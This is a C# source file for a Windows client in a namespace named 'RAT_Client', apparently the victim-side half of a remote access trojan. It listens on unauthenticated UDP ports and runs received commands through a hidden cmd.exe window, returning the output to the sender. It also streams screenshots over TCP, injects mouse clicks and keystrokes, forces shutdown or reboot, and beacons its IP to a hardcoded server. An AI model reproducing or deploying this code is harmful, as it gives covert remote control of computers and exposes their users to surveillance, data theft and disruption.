using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO.Compression;
using WindowsInput;


namespace RAT_Client
{
    public partial class Client_Service : Form
    {
        public string server_ip = "192.168.0.14"; //sets the expected IP address for the server

        //these are the pre requesits for working with the mouse location Data and moving it
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern bool SetCursorPos(int x, int y);

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        public const int MOUSEEVENTF_LEFTDOWN = 0x02;
        public const int MOUSEEVENTF_LEFTUP = 0x04;

        public Client_Service()
        {            

            InitializeComponent();            

        }

        //These are the thread initialisers
        Thread ThreadObject1;
        Thread ThreadObject2;
        Thread ThreadObject3;
        Thread ThreadObject4;
        Thread ThreadObject5;
        Thread ThreadObject6;
        Thread ThreadObject7;
        Thread ThreadObject8;


        private void Form1_Load(object sender, EventArgs e)
        {            
            //Start the threads
            ThreadObject1 = new Thread(Command_listener);
            ThreadObject1.Start(); 
            ThreadObject2 = new Thread(video_stream);
            ThreadObject2.Start();
            ThreadObject3 = new Thread(stay_alive);
            ThreadObject3.Start();
            ThreadObject4 = new Thread(message_listener); 
            ThreadObject4.Start();  
            ThreadObject5 = new Thread(quick_command_listener);
            ThreadObject5.Start(); 
            ThreadObject6 = new Thread(Button_press_listener);
            ThreadObject6.Start();
            ThreadObject7 = new Thread(pointer_position);
            ThreadObject7.Start();
            ThreadObject8 = new Thread(key_input); 
            ThreadObject8.Start();


        }

        public void get_ip_address()
        {
            //If a file is present, the client will use the IP Address in that
            try
            {
                server_ip = File.ReadAllText(@"server_ip_address.txt", Encoding.UTF8);
            }
            catch
            {
            }

        }

        public void Command_listener()
        {

            int listenPort = 10001; //The port the command is coming on


            UdpClient listener = new UdpClient(listenPort); //creating listener on the port 10001
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
            while (true)
            {
                try
                {
                    byte[] bytes = listener.Receive(ref groupEP); //Waits to recieve the incoming message

                    string command = ($" {Encoding.ASCII.GetString(bytes, 0, bytes.Length)}"); //this converts the  byte array back into human readable text
                    string[] command_list = command.Split('~'); //this splits the ip address from the actual command

                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command_list[0]; //adds the command
                    process.StartInfo.UseShellExecute = false; //Makes command execution invisible to the client
                    process.StartInfo.RedirectStandardOutput = true; //redirects output stream to a variable
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start(); //starts the command execution

                    string output = process.StandardOutput.ReadToEnd(); //reads the output of the command
                    string err = process.StandardError.ReadToEnd(); //if there is an error, it will be read here
                    process.WaitForExit(); //wait for the command prompt instance to close
                    if (output != "") //if there are no errors
                    {
                        send_response(command_list[1], 10002, output); //sends output back to server
                    }
                    else //if there is an error
                    {
                        send_response(command_list[1], 10002, err); //send error report back to server

                    }
                }
                catch (SocketException e)
                {
                    MessageBox.Show("Please Contact a System Administrator. Error: " + e, "Warning");
                }

            }
            
        }


        public void message_listener()
        {

            int listenPort = 10004; //The port the command is coming on


            UdpClient listener = new UdpClient(listenPort); //creating listener on the port 10001
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
            while (true)
            {
                try
                {
                    byte[] bytes = listener.Receive(ref groupEP); //Waits to recieve the incoming message

                    string message = ($" {Encoding.ASCII.GetString(bytes, 0, bytes.Length)}"); //this converts the  byte array back into human readable text
                    string[] message_list = message.Split('#'); //this splits the ip address from the actual command
                    this.Invoke((MethodInvoker)(() => this.TopMost = true)); //Puts the message box on top of all other forms
                    SystemSounds.Exclamation.Play(); //Plays a sound to notify the user

                    MessageBox.Show(message_list[1], message_list[0]); //shows the messagebox
                }
                catch (SocketException e)
                {
                    MessageBox.Show("Please Contact a System Administrator. Error: " + e, "Warning");
                }

            }

        }
        public void quick_command_listener()
        {


            int listenPort = 10005; //The port the command is coming on


            UdpClient listener = new UdpClient(listenPort); //creating listener on the port 10001
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
            while (true)
            {
                try
                {
                    byte[] bytes = listener.Receive(ref groupEP); //Waits to recieve the incoming message

                    string message = ($" {Encoding.ASCII.GetString(bytes, 0, bytes.Length)}"); //this converts the  byte array back into human readable text
                    message = message.Trim();
                    if(message == "shutdown")
                    {
                        execute_command("shutdown /s /t 0");

                    }
                    else if(message == "logoff")
                    {
                        execute_command("shutdown /l");

                    }
                    else if (message == "sleep")
                    {
                        execute_command("@ECHO OFF Rundll32.exe user32.dll,LockWorkStation PAUSE");
                    }
                    else if (message == "lock")
                    {
                        execute_command("Rundll32.exe user32.dll,LockWorkStation");
                    }
                    else if (message == "reboot")
                    {

                        execute_command("shutdown /r /t 0");

                    }
                }
                catch (SocketException e)
                {
                    MessageBox.Show("Please Contact a System Administrator. Error: " + e, "Warning");
                }

            }

        }

        public void send_response(string ip_address, int port_no, string return_message)
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            //creates the socket
            IPAddress serverAddr = IPAddress.Parse(ip_address);
            //assigns the address to send the packet to
            IPEndPoint endPoint = new IPEndPoint(serverAddr, port_no);
            //the end point is the destination
            byte[] send_buffer = Encoding.ASCII.GetBytes(return_message);
            //encodes the message into a byte array
            sock.SendTo(send_buffer, endPoint);
            //sends the message
            sock.Dispose();
            //gets rid of the socket, freeing up memory and that port
        }

        public void stay_alive()
        {
            while (true)
            {
                try
                {
                    send_response(server_ip, 10000, GetLocalIPAddress());
                }
                catch
                {

                }
            }
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        public void video_stream()
        {
            while (true)
            {

                bool done = false;

                var listener = new TcpListener(IPAddress.Any, 1045);

                listener.Start();

                while (!done)
                {                    
                    Thread.Sleep(10);

                    Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                    }

                    ImageConverter converter = new ImageConverter();


                    byte[] image = (byte[])converter.ConvertTo(bmp, typeof(byte[]));
                    TcpClient client = listener.AcceptTcpClient();
                    client.NoDelay = true;
                    NetworkStream ns = client.GetStream();

                    try
                    {
                        ns.Write(image, 0, image.Length);
                        ns.Close();
                        client.Close();
                        ns.Dispose();
                        client.Dispose();
                    }
                    catch
                    {
                    }
                    Thread.Sleep(10);


                }
            }
        }


        public void execute_command(string command)
        {
                    Process process = new Process();
                     process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command; //adds the command
                    process.StartInfo.UseShellExecute = false; //Makes command execution invisible to the client
                    process.StartInfo.RedirectStandardOutput = true; //redirects output stream to a variable
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start(); //starts the command execution

                    string output = process.StandardOutput.ReadToEnd(); //reads the output of the command
                    //string err = process.StandardError.ReadToEnd(); //if there is an error, it will be read here
                    process.WaitForExit(); //wait for the command prompt instance to close
        }

        private void Client_Service_FormClosing(object sender, FormClosingEventArgs e)
        {
            ThreadObject1.Abort();
            ThreadObject2.Abort();
            ThreadObject3.Abort();
            ThreadObject4.Abort();
            ThreadObject5.Abort();


        }



        public static void left_click(int xpos, int ypos)
        {
            SetCursorPos(xpos, ypos);
            mouse_event(MOUSEEVENTF_LEFTDOWN, xpos, ypos, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, xpos, ypos, 0, 0);
        }

        public void Button_press_listener()
        {

            int listenPort = 10006; //The port the command is coming on


            UdpClient listener = new UdpClient(listenPort); //creating listener on the port 10001
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
            while (true)
            {
                try
                {
                    byte[] bytes = listener.Receive(ref groupEP); //Waits to recieve the incoming message
                    string coords = ($" {Encoding.ASCII.GetString(bytes, 0, bytes.Length)}");
                    string[] namesArray = coords.Split(',');
                    int x = Int16.Parse(namesArray[0]);
                    int y = Int16.Parse(namesArray[1]);
                    left_click(x, y);


                }
                catch
                {
                }

            }

        }

        public void pointer_position()
        {

            int listenPort = 10007; //The port the command is coming on


            UdpClient listener = new UdpClient(listenPort); //creating listener on the port 10001
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
            while (true)
            {
                try
                {
                    byte[] bytes = listener.Receive(ref groupEP); //Waits to recieve the incoming message
                    string coords = ($" {Encoding.ASCII.GetString(bytes, 0, bytes.Length)}");
                    string[] namesArray = coords.Split(',');
                    int x = Int16.Parse(namesArray[0]);
                    int y = Int16.Parse(namesArray[1]);
                    Cursor.Position = new Point(x, y);

                }
                catch
                {
                }

            }

        }
        public void key_input(object sender)
        {

            int listenPort = 10008; //The port the command is coming on


            UdpClient listener = new UdpClient(listenPort); //creating listener on the port 10001
            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, listenPort);
            while (true)
            {
                try
                {
                    byte[] bytes = listener.Receive(ref groupEP); //Waits to recieve the incoming message
                    string key = ($" {Encoding.ASCII.GetString(bytes, 0, bytes.Length)}");
                    SendKeys.SendWait("{" + key.Trim().ToUpper() + "}");

                }
                catch
                {
                }

            }

        }
    }
}
